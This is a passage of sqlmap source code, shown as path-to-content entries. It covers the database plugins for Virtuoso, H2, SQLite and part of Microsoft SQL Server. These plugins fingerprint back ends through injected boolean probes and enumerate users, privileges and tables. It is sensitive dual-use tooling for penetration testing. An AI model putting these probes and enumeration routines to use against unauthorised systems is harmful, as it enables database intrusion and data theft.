SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/virtuoso/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on Virtuoso it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/virtuoso/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHR(97)||CHR(98)||CHR(99)||CHR(100)||CHR(101)||CHR(102)||CHR(103)||CHR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"CHR(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/virtuoso/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import VIRTUOSO_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.VIRTUOSO)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.VIRTUOSO\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(VIRTUOSO_ALIASES):\n            setDbms(DBMS.VIRTUOSO)\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.VIRTUOSO\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"GET_KEYWORD(NULL,NULL) IS NULL\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.VIRTUOSO\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"RDF_NOW_IMPL() IS NOT NULL\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.VIRTUOSO\n                logger.warning(warnMsg)\n\n                return False\n\n            setDbms(DBMS.VIRTUOSO)\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.VIRTUOSO\n            logger.warning(warnMsg)\n\n            return False\n", "plugins/dbms/virtuoso/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on Virtuoso it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on Virtuoso it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on Virtuoso it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on Virtuoso it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/virtuoso/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on Virtuoso it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on Virtuoso it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/virtuoso/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import VIRTUOSO_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.virtuoso.enumeration import Enumeration\nfrom plugins.dbms.virtuoso.filesystem import Filesystem\nfrom plugins.dbms.virtuoso.fingerprint import Fingerprint\nfrom plugins.dbms.virtuoso.syntax import Syntax\nfrom plugins.dbms.virtuoso.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass VirtuosoMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines Virtuoso methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = VIRTUOSO_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.VIRTUOSO] = Syntax.escape\n", "plugins/dbms/h2/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import H2_DEFAULT_SCHEMA\nfrom lib.request import inject\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getBanner(self):\n        if not conf.getBanner:\n            return\n\n        if kb.data.banner is None:\n            infoMsg = \"fetching banner\"\n            logger.info(infoMsg)\n\n            query = queries[DBMS.H2].banner.query\n            kb.data.banner = unArrayizeValue(inject.getValue(query, safeCharEncode=True))\n\n        return kb.data.banner\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on H2 it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getHostname(self):\n        warnMsg = \"on H2 it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getCurrentDb(self):\n        return H2_DEFAULT_SCHEMA\n\n    def getPasswordHashes(self):\n        warnMsg = \"on H2 it is not possible to enumerate password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getStatements(self):\n        warnMsg = \"on H2 it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/h2/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    def connect(self):\n        errMsg = \"on H2 it is not (currently) possible to establish a \"\n        errMsg += \"direct connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/h2/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97)||CHAR(98)||CHAR(99)||CHAR(100)||CHAR(101)||CHAR(102)||CHAR(103)||CHAR(104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"||\".join(\"CHAR(%d)\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/h2/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.common import hashDBRetrieve\nfrom lib.core.common import hashDBWrite\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import FORK\nfrom lib.core.enums import HASHDB_KEYS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import H2_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.H2)\n\n    def getFingerprint(self):\n        fork = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)\n\n        if fork is None:\n            if inject.checkBooleanExpression(\"EXISTS(SELECT * FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME='IGNITE')\"):\n                fork = FORK.IGNITE\n            else:\n                fork = \"\"\n\n            hashDBWrite(HASHDB_KEYS.DBMS_FORK, fork)\n\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.H2\n            if fork:\n                value += \" (%s fork)\" % fork\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        if fork:\n            value += \"\\n%sfork fingerprint: %s\" % (blank, fork)\n\n        return value\n\n    def checkDbms(self):\n        if not conf.extensiveFp and Backend.isDbmsWithin(H2_ALIASES):\n            setDbms(\"%s %s\" % (DBMS.H2, Backend.getVersion()))\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.H2\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"ZERO()=0\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.H2\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"ROUNDMAGIC(PI())>=3\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.H2\n                logger.warning(warnMsg)\n\n                return False\n            else:\n                setDbms(DBMS.H2)\n\n                self.getBanner()\n\n                return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.H2\n            logger.warning(warnMsg)\n\n            return False\n\n    def getHostname(self):\n        warnMsg = \"on H2 it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n", "plugins/dbms/h2/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on H2 it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on H2 it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on H2 it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on H2 it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/h2/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on H2 it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on H2 it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/h2/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import H2_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.h2.enumeration import Enumeration\nfrom plugins.dbms.h2.filesystem import Filesystem\nfrom plugins.dbms.h2.fingerprint import Fingerprint\nfrom plugins.dbms.h2.syntax import Syntax\nfrom plugins.dbms.h2.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass H2Map(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines H2 methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = H2_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.H2] = Syntax.escape\n", "plugins/dbms/sqlite/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getCurrentUser(self):\n        warnMsg = \"on SQLite it is not possible to enumerate the current user\"\n        logger.warning(warnMsg)\n\n    def getCurrentDb(self):\n        warnMsg = \"on SQLite it is not possible to get name of the current database\"\n        logger.warning(warnMsg)\n\n    def isDba(self, user=None):\n        warnMsg = \"on SQLite the current user has all privileges\"\n        logger.warning(warnMsg)\n\n        return True\n\n    def getUsers(self):\n        warnMsg = \"on SQLite it is not possible to enumerate the users\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def getPasswordHashes(self):\n        warnMsg = \"on SQLite it is not possible to enumerate the user password hashes\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on SQLite it is not possible to enumerate the user privileges\"\n        logger.warning(warnMsg)\n\n        return {}\n\n    def getDbs(self):\n        warnMsg = \"on SQLite it is not possible to enumerate databases (use only '--tables')\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchDb(self):\n        warnMsg = \"on SQLite it is not possible to search databases\"\n        logger.warning(warnMsg)\n\n        return []\n\n    def searchColumn(self):\n        errMsg = \"on SQLite it is not possible to search columns\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def getHostname(self):\n        warnMsg = \"on SQLite it is not possible to enumerate the hostname\"\n        logger.warning(warnMsg)\n\n    def getStatements(self):\n        warnMsg = \"on SQLite it is not possible to enumerate the SQL statements\"\n        logger.warning(warnMsg)\n\n        return []\n", "plugins/dbms/sqlite/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import sqlite3\nexcept:\n    pass\n\nimport logging\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.convert import getText\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapMissingDependence\nfrom plugins.generic.connector import Connector as GenericConnector\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: http://pysqlite.googlecode.com/ and http://packages.ubuntu.com/quantal/python-sqlite\n    User guide: http://docs.python.org/release/2.5/lib/module-sqlite3.html\n    API: http://docs.python.org/library/sqlite3.html\n    Debian package: python-sqlite (SQLite 2), python-pysqlite3 (SQLite 3)\n    License: MIT\n\n    Possible connectors: http://wiki.python.org/moin/SQLite\n    \"\"\"\n\n    def __init__(self):\n        GenericConnector.__init__(self)\n        self.__sqlite = sqlite3\n\n    def connect(self):\n        self.initConnection()\n        self.checkFileDb()\n\n        try:\n            self.connector = self.__sqlite.connect(database=self.db, check_same_thread=False, timeout=conf.timeout)\n\n            cursor = self.connector.cursor()\n            cursor.execute(\"SELECT * FROM sqlite_master\")\n            cursor.close()\n\n        except (self.__sqlite.DatabaseError, self.__sqlite.OperationalError):\n            warnMsg = \"unable to connect using SQLite 3 library, trying with SQLite 2\"\n            logger.warning(warnMsg)\n\n            try:\n                try:\n                    import sqlite\n                except ImportError:\n                    errMsg = \"sqlmap requires 'python-sqlite' third-party library \"\n                    errMsg += \"in order to directly connect to the database '%s'\" % self.db\n                    raise SqlmapMissingDependence(errMsg)\n\n                self.__sqlite = sqlite\n                self.connector = self.__sqlite.connect(database=self.db, check_same_thread=False, timeout=conf.timeout)\n            except (self.__sqlite.DatabaseError, self.__sqlite.OperationalError) as ex:\n                raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except self.__sqlite.OperationalError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        try:\n            self.cursor.execute(getText(query))\n        except self.__sqlite.OperationalError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex))\n        except self.__sqlite.DatabaseError as ex:\n            raise SqlmapConnectionException(getSafeExString(ex))\n\n        self.connector.commit()\n\n    def select(self, query):\n        self.execute(query)\n        return self.fetchall()\n", "plugins/dbms/sqlite/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.convert import getOrds\nfrom plugins.generic.syntax import Syntax as GenericSyntax\n\nclass Syntax(GenericSyntax):\n    @staticmethod\n    def escape(expression, quote=True):\n        \"\"\"\n        >>> Syntax.escape(\"SELECT 'abcdefgh' FROM foobar\") == \"SELECT CHAR(97,98,99,100,101,102,103,104) FROM foobar\"\n        True\n        \"\"\"\n\n        def escaper(value):\n            return \"CHAR(%s)\" % ','.join(\"%d\" % _ for _ in getOrds(value))\n\n        return Syntax._escape(expression, quote, escaper)\n", "plugins/dbms/sqlite/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import Format\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.session import setDbms\nfrom lib.core.settings import METADB_SUFFIX\nfrom lib.core.settings import SQLITE_ALIASES\nfrom lib.request import inject\nfrom plugins.generic.fingerprint import Fingerprint as GenericFingerprint\n\nclass Fingerprint(GenericFingerprint):\n    def __init__(self):\n        GenericFingerprint.__init__(self, DBMS.SQLITE)\n\n    def getFingerprint(self):\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n\n        if not conf.extensiveFp:\n            value += DBMS.SQLITE\n            return value\n\n        actVer = Format.getDbms()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        return value\n\n    def checkDbms(self):\n        \"\"\"\n        References for fingerprint:\n\n        * http://www.sqlite.org/lang_corefunc.html\n        * http://www.sqlite.org/cvstrac/wiki?p=LoadableExtensions\n        \"\"\"\n\n        if not conf.extensiveFp and Backend.isDbmsWithin(SQLITE_ALIASES):\n            setDbms(DBMS.SQLITE)\n\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.SQLITE\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"LAST_INSERT_ROWID()=LAST_INSERT_ROWID()\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.SQLITE\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"SQLITE_VERSION()=SQLITE_VERSION()\")\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.SQLITE\n                logger.warning(warnMsg)\n\n                return False\n            else:\n                infoMsg = \"actively fingerprinting %s\" % DBMS.SQLITE\n                logger.info(infoMsg)\n\n                result = inject.checkBooleanExpression(\"RANDOMBLOB(-1)>0\")\n                version = '3' if result else '2'\n                Backend.setVersion(version)\n\n            setDbms(DBMS.SQLITE)\n\n            self.getBanner()\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.SQLITE\n            logger.warning(warnMsg)\n\n            return False\n\n    def forceDbmsEnum(self):\n        conf.db = \"%s%s\" % (DBMS.SQLITE, METADB_SUFFIX)\n", "plugins/dbms/sqlite/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def osCmd(self):\n        errMsg = \"on SQLite it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osShell(self):\n        errMsg = \"on SQLite it is not possible to execute commands\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osPwn(self):\n        errMsg = \"on SQLite it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def osSmb(self):\n        errMsg = \"on SQLite it is not possible to establish an \"\n        errMsg += \"out-of-band connection\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/sqlite/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.exception import SqlmapUnsupportedFeatureException\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def readFile(self, remoteFile):\n        errMsg = \"on SQLite it is not possible to read files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n\n    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):\n        errMsg = \"on SQLite it is not possible to write files\"\n        raise SqlmapUnsupportedFeatureException(errMsg)\n", "plugins/dbms/sqlite/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import SQLITE_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.sqlite.enumeration import Enumeration\nfrom plugins.dbms.sqlite.filesystem import Filesystem\nfrom plugins.dbms.sqlite.fingerprint import Fingerprint\nfrom plugins.dbms.sqlite.syntax import Syntax\nfrom plugins.dbms.sqlite.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass SQLiteMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines SQLite methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = SQLITE_SYSTEM_DBS\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.SQLITE] = Syntax.escape\n", "plugins/dbms/mssqlserver/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\n\nfrom lib.core.agent import agent\nfrom lib.core.common import arrayizeValue\nfrom lib.core.common import getLimitRange\nfrom lib.core.common import isInferenceAvailable\nfrom lib.core.common import isNoneValue\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import safeSQLIdentificatorNaming\nfrom lib.core.common import safeStringFormat\nfrom lib.core.common import singleTimeLogMessage\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.common import unsafeSQLIdentificatorNaming\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.settings import CURRENT_DB\nfrom lib.request import inject\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\nfrom thirdparty import six\n\nclass Enumeration(GenericEnumeration):\n    def getPrivileges(self, *args, **kwargs):\n        warnMsg = \"on Microsoft SQL Server it is not possible to fetch \"\n        warnMsg += \"database users privileges, sqlmap will check whether \"\n        warnMsg += \"or not the database users are database administrators\"\n        logger.warning(warnMsg)\n\n        users = []\n        areAdmins = set()\n\n        if conf.user:\n            users = [conf.user]\n        elif not len(kb.data.cachedUsers):\n            users = self.getUsers()\n        else:\n            users = kb.data.cachedUsers\n\n        for user in users:\n            user = unArrayizeValue(user)\n\n            if user is None:\n                continue\n\n            isDba = self.isDba(user)\n\n            if isDba is True:\n                areAdmins.add(user)\n\n            kb.data.cachedUsersPrivileges[user] = None\n\n        return (kb.data.cachedUsersPrivileges, areAdmins)\n\n    def getTables(self):\n        if len(kb.data.cachedTables) > 0:\n            return kb.data.cachedTables\n\n        self.forceDbmsEnum()\n\n        if conf.db == CURRENT_DB:\n            conf.db = self.getCurrentDb()\n\n        if conf.db:\n            dbs = conf.db.split(',')\n        else:\n            dbs = self.getDbs()\n\n        for db in dbs:\n            dbs[dbs.index(db)] = safeSQLIdentificatorNaming(db)\n\n        dbs = [_ for _ in dbs if _]\n\n        infoMsg = \"fetching tables for database\"\n        infoMsg += \"%s: %s\" % (\"s\" if len(dbs) > 1 else \"\", \", \".join(db if isinstance(db, six.string_types) else db[0] for db in sorted(dbs)))\n        logger.info(infoMsg)\n\n        rootQuery = queries[DBMS.MSSQL].tables\n\n        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n            for db in dbs:\n                if conf.excludeSysDbs and db in self.excludeDbsList:\n                    infoMsg = \"skipping system database '%s'\" % db\n                    singleTimeLogMessage(infoMsg)\n                    continue\n\n                if conf.exclude and re.search(conf.exclude, db, re.I) is not None:\n                    infoMsg = \"skipping database '%s'\" % db\n                    singleTimeLogMessage(infoMsg)\n                    continue\n\n                for query in 